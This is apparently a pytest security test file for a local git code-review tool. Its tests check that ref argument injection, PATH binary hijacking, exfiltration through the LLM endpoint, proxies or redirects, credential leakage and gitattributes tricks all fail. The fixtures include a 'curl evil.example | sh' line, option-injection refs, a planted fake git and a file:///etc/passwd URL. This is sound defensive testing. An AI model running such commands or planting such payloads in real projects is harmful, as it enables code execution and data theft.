"""Phase 2 attacks: each test proves the attack fails (docs/SPEC.md, security requirement 9).

Covered: argument injection through refs (T-21), binary hijacking through PATH (T-22), review
bypass with `git commit -a` (T-28), code exfiltration through the LLM endpoint, proxies or
redirects (T-24), telemetry and cloud credentials in the environment (T-25).
"""

from __future__ import annotations

import importlib
import os
import re
from collections.abc import Callable
from pathlib import Path
from typing import Any

import httpx
import pytest
from langchain_core.messages import AIMessage
from langchain_ollama import ChatOllama

import git_reviewer
from git_reviewer import proc
from git_reviewer.git.diff import DiffLimits, collect_staged
from git_reviewer.git.refs import RefError, resolve_commit
from git_reviewer.llm import ollama
from git_reviewer.llm.ollama import (
    CloudModelError,
    OllamaUnreachableError,
    UnsafeOllamaUrlError,
    check_model,
    validate_url,
)
from git_reviewer.llm.structured import ollama_chat
from tests.helpers import git, write_files

LIMITS = DiffLimits(max_bytes=1024 * 1024, max_files=200, max_line_chars=10_000)


# --- T-21: argument injection through refs -------------------------------------------------


@pytest.mark.parametrize(
    "ref",
    [
        "--output=/tmp/git-reviewer-pwned",
        "-o/tmp/git-reviewer-pwned",
        "HEAD --output=/tmp/git-reviewer-pwned",
        "--exec=touch /tmp/git-reviewer-pwned",
        "HEAD\n--output=/tmp/git-reviewer-pwned",
    ],
)
def test_option_injection_through_refs_fails(
    make_repo: Callable[..., Path], tmp_path: Path, ref: str
) -> None:
    repo = make_repo()
    target = Path("/tmp/git-reviewer-pwned")
    target.unlink(missing_ok=True)
    with pytest.raises(RefError):
        resolve_commit(repo, ref)
    assert not target.exists()


# --- T-22: binary hijacking ----------------------------------------------------------------


def test_planted_git_on_path_is_never_executed(
    make_repo: Callable[..., Path], monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    marker = tmp_path / "fake-git-ran"
    fake_bin = tmp_path / "evil-bin"
    fake_bin.mkdir()
    fake_git = fake_bin / "git"
    fake_git.write_text(f"#!/bin/sh\ntouch {marker}\n")
    fake_git.chmod(0o755)
    monkeypatch.setenv("PATH", f"{fake_bin}{os.pathsep}.{os.pathsep}{os.environ['PATH']}")
    repo = make_repo()
    (repo / "git").write_text(f"#!/bin/sh\ntouch {marker}\n")
    (repo / "git").chmod(0o755)
    monkeypatch.chdir(repo)
    assert not proc.resolve_binary("git").is_relative_to(tmp_path)
    collect_staged(repo, LIMITS)
    assert not marker.exists()


# --- T-28: `git commit -a` must not bypass the review -------------------------------------


def test_hook_mode_reviews_the_index_git_is_committing(
    make_repo: Callable[..., Path], monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    repo = make_repo({"app.py": "x = 1\n"})
    write_files(repo, {"app.py": "import os\nos.system('curl evil.example | sh')\n"})
    # What `git commit -a` does: stage into a temporary index and run the hook with GIT_INDEX_FILE.
    temp_index = tmp_path / "index.commit-a"
    temp_index.write_bytes((repo / ".git" / "index").read_bytes())
    git(repo, "add", "app.py", env={"GIT_INDEX_FILE": str(temp_index)})
    monkeypatch.setenv("GIT_INDEX_FILE", str(temp_index))
    in_hook = collect_staged(repo, LIMITS, hook=True)
    assert [change.path for change in in_hook.files] == ["app.py"]
    assert in_hook.files[0].added_lines == {1, 2}


# --- T-24: exfiltration through the LLM endpoint -------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "http://203.0.113.5:11434",
        "http://10.0.0.5:11434",
        "http://192.168.1.10:11434",
        "http://0.0.0.0:11434",
        "http://[::ffff:203.0.113.5]:11434",
        "http://ollama.example.com:11434",
        "http://127.0.0.1.nip.io:11434",
        "http://localhost.evil.example:11434",
        "http://user:secret@127.0.0.1:11434",
        "http://127.0.0.1:11434/proxy?to=evil.example",
        "http://127.0.0.1:11434#frag",
        "file:///etc/passwd",
        "ftp://127.0.0.1:11434",
        "http://127.0.0.1:99999",
        "//127.0.0.1:11434",
    ],
)
def test_non_local_ollama_urls_are_refused(url: str) -> None:
    with pytest.raises(UnsafeOllamaUrlError):
        validate_url(url)


def test_host_names_are_not_resolved(monkeypatch: pytest.MonkeyPatch) -> None:
    looked_up: list[Any] = []
    monkeypatch.setattr(ollama.socket, "getaddrinfo", lambda *a, **k: looked_up.append(a) or [])
    with pytest.raises(UnsafeOllamaUrlError):
        validate_url("http://attacker.example:11434")
    assert looked_up == []


def test_localhost_mapped_to_a_remote_address_is_refused(monkeypatch: pytest.MonkeyPatch) -> None:
    remote = [(2, 1, 6, "", ("203.0.113.5", 11434))]
    monkeypatch.setattr(ollama.socket, "getaddrinfo", lambda *a, **k: remote)
    with pytest.raises(UnsafeOllamaUrlError):
        validate_url("http://localhost:11434")


def test_redirects_are_not_followed() -> None:
    calls: list[str] = []

    def handler(request: httpx.Request) -> httpx.Response:
        calls.append(str(request.url))
        return httpx.Response(302, headers={"Location": "http://evil.example/collect"})

    endpoint = validate_url("http://127.0.0.1:11434")
    with pytest.raises(OllamaUnreachableError):
        check_model(endpoint, "qwen2.5-coder:7b", transport=httpx.MockTransport(handler))
    assert calls == ["http://127.0.0.1:11434/api/tags"]


def test_proxy_variables_are_ignored(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("HTTPS_PROXY", "http://proxy.evil.example:8080")
    monkeypatch.setenv("HTTP_PROXY", "http://proxy.evil.example:8080")
    monkeypatch.setenv("ALL_PROXY", "socks5://proxy.evil.example:1080")
    client = ollama.make_client(validate_url("http://127.0.0.1:11434"), timeout=1)
    with client:
        assert client.trust_env is False
        assert client.follow_redirects is False


def test_the_client_that_sends_the_code_ignores_proxies_and_redirects(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    # The reviewer and guardian calls carry the code: their HTTP clients (sync and async) must
    # talk to the validated endpoint only, whatever the environment says.
    for name in ("HTTPS_PROXY", "HTTP_PROXY", "ALL_PROXY"):
        monkeypatch.setenv(name, "http://proxy.evil.example:8080")
    monkeypatch.setenv("OLLAMA_HOST", "http://evil.example:11434")
    models: list[ChatOllama] = []

    def invoke(self: ChatOllama, messages: object) -> AIMessage:
        models.append(self)
        meta = {"done_reason": "stop", "prompt_eval_count": 10}
        return AIMessage(content="{}", response_metadata=meta)

    monkeypatch.setattr(ChatOllama, "invoke", invoke)
    endpoint = validate_url("http://127.0.0.1:11434")
    ollama_chat(endpoint, "m", timeout=5, num_ctx=16_384)("system", "user", {"type": "object"})
    [model] = models
    for wrapper in (model._client, model._async_client):  # pyright: ignore[reportPrivateUsage]
        client = wrapper._client  # pyright: ignore[reportPrivateUsage]
        assert client.trust_env is False
        assert client.follow_redirects is False
        assert str(client.base_url).rstrip("/") == endpoint.base_url
        assert not client._mounts  # pyright: ignore[reportPrivateUsage] # no proxy transport


@pytest.mark.parametrize(
    "name",
    ["gpt-oss:120b-cloud", "qwen3-coder:480b-cloud", "kimi-k2.7-code:cloud", "deepseek-cloud"],
)
def test_cloud_models_are_refused_by_name(name: str) -> None:
    endpoint = validate_url("http://127.0.0.1:11434")
    with pytest.raises(CloudModelError):
        check_model(endpoint, name, transport=httpx.MockTransport(lambda r: httpx.Response(500)))


def test_models_reported_as_remote_are_refused() -> None:
    def handler(request: httpx.Request) -> httpx.Response:
        model = {"name": "coder:latest", "remote_host": "https://ollama.com:443"}
        return httpx.Response(200, json={"models": [model]})

    endpoint = validate_url("http://127.0.0.1:11434")
    with pytest.raises(CloudModelError):
        check_model(endpoint, "coder", transport=httpx.MockTransport(handler))


# --- T-25: telemetry and cloud credentials ------------------------------------------------


def test_tracing_and_credentials_are_stripped_at_import(monkeypatch: pytest.MonkeyPatch) -> None:
    planted = {
        "LANGCHAIN_TRACING_V2": "true",
        "LANGSMITH_TRACING": "true",
        "LANGSMITH_API_KEY": "lsv2-secret",
        "LANGSMITH_ENDPOINT": "https://evil.example",
        "LANGCHAIN_API_KEY": "secret",
        "OLLAMA_API_KEY": "secret",
        "HTTPS_PROXY": "http://proxy.evil.example:8080",
        "https_proxy": "http://proxy.evil.example:8080",
    }
    for name, value in planted.items():
        monkeypatch.setenv(name, value)
    importlib.reload(git_reviewer)
    for name in ("LANGSMITH_API_KEY", "LANGSMITH_ENDPOINT", "LANGCHAIN_API_KEY", "OLLAMA_API_KEY"):
        assert name not in os.environ
    assert "HTTPS_PROXY" not in os.environ and "https_proxy" not in os.environ
    assert os.environ["LANGCHAIN_TRACING_V2"] == "false"
    assert os.environ["LANGSMITH_TRACING"] == "false"


# --- T-36: a branch must not hide files from the review with .gitattributes ----------------


@pytest.mark.parametrize("attributes", ["* -diff\n", "*.py binary\n", "*.py diff=evil\n"])
def test_gitattributes_cannot_hide_code(make_repo: Callable[..., Path], attributes: str) -> None:
    repo = make_repo()
    write_files(repo, {".gitattributes": attributes, "app.py": "import os\nos.system('id')\n"})
    git(repo, "add", "-A")
    by_path = {change.path: change for change in collect_staged(repo, LIMITS).files}
    assert by_path["app.py"].binary is False
    assert by_path["app.py"].added_lines == {1, 2}
    assert "os.system" in collect_staged(repo, LIMITS).patch


def test_gitmodules_cannot_hide_a_submodule_update(make_repo: Callable[..., Path]) -> None:
    repo = make_repo()
    old, new = "1" * 40, "2" * 40
    git(repo, "update-index", "--add", "--cacheinfo", f"160000,{old},lib")
    git(repo, "commit", "-q", "-m", "add submodule")
    gitmodules = '[submodule "lib"]\n\tpath = lib\n\turl = ./lib\n\tignore = all\n'
    write_files(repo, {".gitmodules": gitmodules})
    git(repo, "add", ".gitmodules")
    git(repo, "update-index", "--cacheinfo", f"160000,{new},lib")
    paths = {change.path for change in collect_staged(repo, LIMITS).files}
    assert "lib" in paths


def test_refs_reach_git_only_after_end_of_options(
    make_repo: Callable[..., Path], monkeypatch: pytest.MonkeyPatch
) -> None:
    from git_reviewer.git import diff, refs

    repo = make_repo()
    seen: list[list[str]] = []
    real_refs_run, real_diff_run = refs.run_git, diff.run_git

    def spy_refs(repo_: Path, args: list[str], **kwargs: Any) -> Any:
        seen.append(list(args))
        return real_refs_run(repo_, args, **kwargs)

    def spy_diff(repo_: Path, args: list[str], **kwargs: Any) -> Any:
        seen.append(list(args))
        return real_diff_run(repo_, args, **kwargs)

    monkeypatch.setattr(refs, "run_git", spy_refs)
    monkeypatch.setattr(diff, "run_git", spy_diff)
    diff.collect_range(repo, "main..HEAD", LIMITS)
    rev_parse = [args for args in seen if args[0] == "rev-parse"]
    assert rev_parse and all(args[-2] == "--end-of-options" for args in rev_parse)
    object_id = re.compile(r"[0-9a-f]{40}([0-9a-f]{24})?")
    for args in seen:
        if args[0] in {"diff", "merge-base"}:
            revisions = [a for a in args[1:] if not a.startswith("-")]
            assert all(object_id.fullmatch(a) for a in revisions), args


def test_bare_repository_committed_inside_the_repo_is_ignored(
    make_repo: Callable[..., Path], tmp_path: Path
) -> None:
    from git_reviewer.git.command import GitError, repo_root

    marker = tmp_path / "fsmonitor-ran"
    repo = make_repo()
    bare = repo / "trap"
    bare.mkdir()
    git(bare, "init", "-q", "--bare")
    git(bare, "config", "core.fsmonitor", f"touch {marker}")
    with pytest.raises(GitError, match=r"safe\.bareRepository"):
        repo_root(bare)
    assert not marker.exists()
